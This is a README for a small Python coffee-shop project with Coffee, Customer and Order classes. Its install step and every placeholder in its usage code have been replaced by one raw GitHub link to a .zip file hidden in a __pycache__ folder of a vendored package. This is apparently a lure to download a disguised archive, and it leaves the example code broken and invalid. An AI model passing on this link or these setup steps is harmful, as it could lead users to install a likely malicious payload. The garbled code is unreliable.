# Coffee Shop Project

Welcome to the Coffee Shop Project! This Python application models a coffee shop domain using object-oriented principles. The project includes classes for managing coffee types, customers, and orders.

## Table of Contents
1. [Project Overview](#project-overview)
2. [Features](#features)
3. [Installation](#installation)
4. [Usage](#usage)
5. [Running Tests](#running-tests)
6. [Contributing](#contributing)
7. [License](#license)

## Project Overview

This project includes three primary classes:
- **`Coffee`**: Represents a type of coffee and tracks related orders.
- **`Customer`**: Represents a customer who places orders.
- **`Order`**: Represents an order made by a customer for a specific coffee.

## Features

- **Coffee Management**: Add coffee types, track orders, and calculate the average price of orders.
- **Customer Management**: Add customers, create orders, and track their coffee purchases.
- **Order Tracking**: Validate order details and manage relationships between customers and coffees.

## Installation

Follow these steps to set up the project:

1. **Clone the Repository**:
    ```bash
    git clone https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip
    cd coffee-shop
    ```

2. **Install Dependencies**:
    ```bash
    pipenv install
    ```

3. **Activate the Virtual Environment**:
    ```bash
    pipenv shell
    ```

## Usage

Here's an example of how to use the classes in the Coffee Shop project:

```python
from coffee import Coffee
from customer import Customer
from order import Order

# Create instances
coffee = Coffee("Latte")
customer = Customer("Alice")

# Create an order
order = Order(customer, coffee, 5.0)

# Access data
print(f"Coffee Name: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip}")
print(f"Customer Name: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip}")
print(f"Order Price: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip}")

# Check orders
print(f"Total Orders for {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip}: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip()}")
print(f"Average Price: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip()}")
print(f"Customers: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip()}")
print(f"Customer Coffees: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip()}")
print(f"Most Aficionado: {https://raw.githubusercontent.com/GathogoG/coffee_shop_project/main/myenv/lib/python3.12/site-packages/setuptools/_vendor/importlib_metadata/compat/__pycache__/project_shop_coffee_obvoluted.zip(coffee)}")
